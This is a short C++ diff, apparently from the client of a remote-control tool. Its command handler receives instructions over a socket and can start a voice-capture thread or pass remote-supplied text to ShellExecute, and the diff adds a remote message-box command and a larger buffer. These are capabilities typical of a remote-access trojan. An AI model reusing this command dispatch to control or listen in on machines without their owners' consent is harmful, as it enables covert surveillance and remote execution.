@@ -17,7 +17,7 @@
 //套接字的初始化
 DWORD __stdcall ConnectThread(LPVOID lparam)
 {
-	char Buffer[1024];
+	char Buffer[1024 * 100];
 	SOCKET MainSocket=socket(AF_INET,SOCK_STREAM,0);
 	struct sockaddr_in LocalAddr;
 	LocalAddr.sin_family=AF_INET;
@@ -86,12 +86,24 @@ DWORD __stdcall ConnectThread(LPVOID lparam)
 			}
 		case CMD_VOICE:
 			{
-					CreateThread(NULL, NULL, VoiceThread, NULL, NULL, NULL);;
+			    CreateThread(NULL, NULL, VoiceThread, NULL, NULL, NULL);;
 				break;
 			}
 		case CMD_OPEN_URL:
 			{
 				ShellExecute(NULL, "open", Buffer, NULL, NULL, SW_SHOWNORMAL);
+				break;
+			}
+		case CMD_MESSAGEBOX:
+			{
+				char *temp = new char[1024*10];
+				strncpy(temp, Buffer, 1024*10);
+				RecvMsg(MainSocket, (char *)Buffer, &msgHead);
+				if(msgHead.dwExtend1 == 2)
+				::MessageBox(NULL, Buffer, temp, MB_OK|MB_ICONERROR);
+				else
+					::MessageBox(NULL, Buffer, temp, MB_YESNO);
+				delete temp;
 				break;
 			}
 		case CMD_HEARTBEAT://心跳包
